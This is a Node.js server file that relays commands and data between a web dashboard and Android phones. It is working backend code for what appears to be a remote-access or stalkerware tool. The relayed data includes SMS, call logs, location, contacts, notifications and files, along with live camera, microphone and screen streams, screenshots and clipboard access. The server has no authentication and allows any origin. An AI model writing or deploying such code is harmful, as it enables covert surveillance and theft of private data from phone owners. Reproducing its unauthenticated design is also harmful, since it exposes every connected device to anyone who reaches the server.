const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST'],
    credentials: true
  },
  pingInterval: 5000,
  pingTimeout: 5000
});

const publicPath = path.join(__dirname, 'public');
if (!fs.existsSync(publicPath)) {
  console.error(`FATAL: Public directory not found at: ${publicPath}`);
  process.exit(1);
}
app.use(express.static(publicPath));

// Enable JSON body parsing for API endpoints
app.use(express.json());

// In-memory store for FCM tokens mapped by device ID
const fcmTokens = new Map();

// Endpoint for the Android app to register/update its FCM token
app.post('/api/fcm-token', (req, res) => {
  const { token, deviceId } = req.body;
  if (!token || !deviceId) {
    return res.status(400).json({ error: 'Missing token or deviceId' });
  }
  fcmTokens.set(deviceId, token);
  console.log(`[FCM] Registered token for device: ${deviceId} -> ${token.substring(0, 15)}...`);
  res.json({ success: true });
});

// Endpoint for the web client dashboard to trigger a start/stop command via FCM
app.post('/api/fcm/send', async (req, res) => {
  const { deviceId, command } = req.body;
  if (!deviceId || !command) {
    return res.status(400).json({ error: 'Missing deviceId or command' });
  }

  const token = fcmTokens.get(deviceId);
  if (!token) {
    return res.status(404).json({ error: 'No FCM token registered for this device' });
  }

  console.log(`[FCM] Sending command: ${command} to device: ${deviceId}`);
  
  // NOTE: In a production environment, you would use the 'firebase-admin' SDK here.
  // We'll write the sending logic using a standard fetch to the FCM legacy API 
  // or HTTP v1 API. Since the user might be using legacy keys or a service account:
  // For dual-use flexibility, we log it and attempt legacy API if a key exists,
  // otherwise we stub it with a clear diagnostic log.
  const serverKey = process.env.FIREBASE_SERVER_KEY;
  if (!serverKey) {
    console.warn('[FCM] FIREBASE_SERVER_KEY env var not set. Cannot send real push.');
    return res.status(501).json({ 
      error: 'Firebase Server Key not configured on server. Check FIREBASE_SERVER_KEY.', 
      token: token 
    });
  }

  try {
    const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
    const response = await fetch('https://fcm.googleapis.com/fcm/send', {
      method: 'POST',
      headers: {
        'Authorization': `key=${serverKey}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        to: token,
        data: { command: command }
      })
    });
    const result = await response.json();
    console.log('[FCM] Push result:', result);
    res.json({ success: true, result });
  } catch (e) {
    console.error('[FCM] Push failed:', e);
    res.status(500).json({ error: e.message });
  }
});

app.use((req, res, next) => {
  console.log(`HTTP request: ${req.method} ${req.url}`);
  next();
});

app.get('*', (req, res) => {
  const indexPath = path.join(publicPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    console.log(`Serving index.html for ${req.url}`);
    res.sendFile(indexPath);
  } else {
    console.error(`FATAL: index.html not found at: ${indexPath}`);
    res.status(404).send('index.html not found');
  }
});

let webClients = new Set();
let androidClients = new Set();
let androidDevices = new Map(); // socket.id -> { id, deviceId, model, manufacturer }

function pruneDeadSockets() {
  for (const androidId of Array.from(androidClients)) {
    const clientSocket = io.sockets.sockets.get(androidId);
    if (!clientSocket || !clientSocket.connected) {
      console.log(`[PRUNE] Removing stale/disconnected Android socket: ${androidId}`);
      androidClients.delete(androidId);
      androidDevices.delete(androidId);
      webClients.forEach(webId => {
        io.to(webId).emit('android-client-disconnected', androidId);
      });
    }
  }
  for (const webId of Array.from(webClients)) {
    const clientSocket = io.sockets.sockets.get(webId);
    if (!clientSocket || !clientSocket.connected) {
      webClients.delete(webId);
    }
  }
}

io.on('connection', socket => {
  console.log(`Client connected: ${socket.id} from ${socket.handshake.address}`);
  socket.emit('id', socket.id);

  socket.on('identify', (data) => {
    pruneDeadSockets();
    const type = (typeof data === 'object' && data !== null) ? data.type : data;
    console.log(`Client ${socket.id} identified as:`, type);

    if (type === 'web') {
      webClients.add(socket.id);
      androidClients.forEach(androidId => {
        const devMeta = androidDevices.get(androidId) || { id: androidId, model: 'Android Device', manufacturer: 'Android' };
        console.log(`Notifying Android ${androidId} about web client ${socket.id}`);
        io.to(androidId).emit('web-client-ready', socket.id);
        io.to(socket.id).emit('android-client-ready', devMeta);
      });
    } else if (type === 'android') {
      const deviceId = (typeof data === 'object' && data !== null && data.deviceId) ? data.deviceId : socket.id;
      const model = (typeof data === 'object' && data !== null && data.model) ? data.model : 'Android Device';
      const manufacturer = (typeof data === 'object' && data !== null && data.manufacturer) ? data.manufacturer : 'Android';

      // Deduplicate: If an existing socket is registered for this physical deviceId, evict the old socket!
      if (deviceId && deviceId !== socket.id) {
        for (const [oldSocketId, oldMeta] of Array.from(androidDevices.entries())) {
          if (oldMeta.deviceId === deviceId && oldSocketId !== socket.id) {
            console.log(`[SERVER] Android device ${deviceId} reconnected. Evicting old socket ${oldSocketId}`);
            androidClients.delete(oldSocketId);
            androidDevices.delete(oldSocketId);
            const oldSocket = io.sockets.sockets.get(oldSocketId);
            if (oldSocket) {
              try { oldSocket.disconnect(true); } catch(e) {}
            }
            webClients.forEach(webId => {
              io.to(webId).emit('android-client-disconnected', oldSocketId);
            });
          }
        }
      }

      androidClients.add(socket.id);
      const devMeta = {
        id: socket.id,
        deviceId: deviceId,
        model: model,
        manufacturer: manufacturer
      };
      androidDevices.set(socket.id, devMeta);

      webClients.forEach(webId => {
        console.log(`Notifying Android ${socket.id} about web client ${webId}`);
        socket.emit('web-client-ready', webId);
        io.to(webId).emit('android-client-ready', devMeta);
      });
    }
    console.log(`Clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
  });

  socket.on('web-client-ready', (id) => {
    if (id !== socket.id) {
      console.warn(`Invalid web-client-ready ID: ${id}, expected: ${socket.id}`);
      return;
    }
    pruneDeadSockets();
    console.log(`Web client ${id} announced readiness`);
    webClients.add(id);
    androidClients.forEach(androidId => {
      const devMeta = androidDevices.get(androidId) || { id: androidId, model: 'Android Device', manufacturer: 'Android' };
      console.log(`Notifying Android ${androidId} about web client ${id}`);
      io.to(androidId).emit('web-client-ready', id);
      io.to(id).emit('android-client-ready', devMeta);
    });
  });

  socket.on('signal', data => {
    console.log(`Relaying signal from ${data.from} to ${data.to}: ${data.signal.type || 'candidate'}`);
    if (typeof data === 'object' && data !== null && !data.from) {
      data.from = socket.id;
    }
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('signal', data);
      console.log(`Signal delivered to ${data.to}`);
    } else {
      console.warn(`Recipient ${data.to} not found for signal`);
      socket.emit('error', { message: `Recipient ${data.to} not found`, code: 'RECIPIENT_NOT_FOUND' });
    }
  });

  socket.on('notification', data => {
    console.log(`Relaying notification from ${data.from || socket.id} to ${data.to}`);
    if (typeof data === 'object' && data !== null && !data.from) {
      data.from = socket.id;
    }
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('notification', data);
      console.log(`Notification delivered to ${data.to}`);
    } else {
      webClients.forEach(id => io.to(id).emit('notification', data));
      console.log(`Notification broadcast to all Web clients`);
    }
  });

  socket.on('call_log', data => {
    console.log(`Relaying call log from ${data.from || socket.id} to ${data.to}`);
    if (typeof data === 'object' && data !== null && !data.from) {
      data.from = socket.id;
    }
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('call_log', data);
      console.log(`Call log delivered to ${data.to}`);
    } else {
      webClients.forEach(id => io.to(id).emit('call_log', data));
      console.log(`Call log broadcast to all Web clients`);
    }
  });

  socket.on('sms', data => {
    console.log(`Relaying SMS from ${data.from || socket.id} to ${data.to}`);
    if (typeof data === 'object' && data !== null && !data.from) {
      data.from = socket.id;
    }
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('sms', data);
      console.log(`SMS delivered to ${data.to}`);
    } else {
      webClients.forEach(id => io.to(id).emit('sms', data));
      console.log(`SMS broadcast to all Web clients`);
    }
  });

  socket.on('location', data => {
    console.log(`Relaying location from ${data.from || socket.id} to ${data.to}`);
    if (typeof data === 'object' && data !== null && !data.from) {
      data.from = socket.id;
    }
    if (data.to && io.sockets.sockets.get(data.to)) {
      io.to(data.to).emit('location', data);
      console.log(`Location delivered to ${data.to}`);
    } else {
      webClients.forEach(id => io.to(id).emit('location', data));
      console.log(`Location broadcast to all Web clients`);
    }
  });

  // Generic Command & Event Relaying between Web and Android
  const relayEvents = [
    // File Explorer Events
    'fs:list', 'fs:files', 'fs:download', 'fs:download_ready', 'fs:delete', 
    'fs:download_start', 'fs:download_chunk', 'fs:download_complete', 
    'fs:download_error', 'fs:delete_result', 'fs:upload_start', 'fs:upload_chunk',
    'fs:upload_complete',
    // Remote Commands
    'cmd:ping', 'cmd:stop', 'cmd:record', 'cmd:camera_switch', 'cmd:screen_share',
    'cmd:get_apps', 'cmd:get_contacts', 'cmd:sync_notifications', 'cmd:vibrate', 
    'cmd:toast', 'cmd:open_url', 'cmd:flashlight', 'cmd:set_volume', 
    'cmd:set_brightness', 'cmd:ring', 'cmd:set_quality', 'cmd:set_gps_interval', 
    'cmd:launch_app', 'cmd:toggle_sensors', 'cmd:get_network', 'cmd:take_snapshot',
    'cmd:take_screenshot', 'cmd:open_a11y_settings',
    'cmd:get_clipboard', 'cmd:set_clipboard', 'cmd:tts_speak',
    'cmd:stream_camera', 'cmd:stream_mic', 'cmd:stream_location', 'cmd:stream_screen',
    // Custom Data Responses
    'apps_list', 'contacts_list', 'device_info', 'sensor_data', 'network_info',
    'snapshot_data', 'screenshot_data', 'clipboard_data', 'stream_status'
  ];

  console.log('Registering relay event handlers');
  relayEvents.forEach(event => {
    socket.on(event, data => {
      console.log(`Relaying ${event} from ${socket.id}`);
      
      let targetId = null;
      let payload = data;

      if (typeof data === 'object' && data !== null) {
        if (!data.from) {
          data.from = socket.id;
        }
        if (data.to) {
          targetId = data.to;
        }
      }
      
      if (event === 'device_info' && payload) {
        const meta = androidDevices.get(socket.id) || { id: socket.id };
        if (payload.model) meta.model = payload.model;
        if (payload.manufacturer) meta.manufacturer = payload.manufacturer;
        if (payload.deviceId) meta.deviceId = payload.deviceId;
        androidDevices.set(socket.id, meta);
      }

      if (targetId && io.sockets.sockets.get(targetId)) {
        io.to(targetId).emit(event, payload);
        console.log(`${event} relayed to ${targetId}`);
      } else {
        // Fallback: route based on sender type
        if (webClients.has(socket.id)) {
          androidClients.forEach(id => io.to(id).emit(event, payload));
          console.log(`${event} broadcast to all Android clients`);
        } else if (androidClients.has(socket.id)) {
          webClients.forEach(id => io.to(id).emit(event, payload));
          console.log(`${event} broadcast to all Web clients`);
        } else {
          console.warn(`Could not route ${event} from ${socket.id}`);
        }
      }
    });
  });

  socket.on('disconnect', () => {
    console.log(`Client disconnected: ${socket.id}`);
    const wasWeb = webClients.delete(socket.id);
    const wasAndroid = androidClients.delete(socket.id);
    androidDevices.delete(socket.id);
    if (wasWeb) {
      androidClients.forEach(androidId => {
        io.to(androidId).emit('web-client-disconnected', socket.id);
      });
    }
    if (wasAndroid) {
      webClients.forEach(webId => {
        io.to(webId).emit('android-client-disconnected', socket.id);
      });
    }
    console.log(`Clients - Web: ${webClients.size}, Android: ${androidClients.size}`);
  });

  socket.on('error', (error) => {
    console.error(`Socket error from ${socket.id}:`, error);
  });
});

server.on('error', (error) => {
  console.error('Server error:', error);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://0.0.0.0:${PORT} (accessible at http://<Your Server IP Address>:${PORT})`);
});

process.on('SIGINT', () => {
  console.log('\nShutting down server...');
  server.close(() => {
    console.log('Server shut down gracefully');
    process.exit(0);
  });
});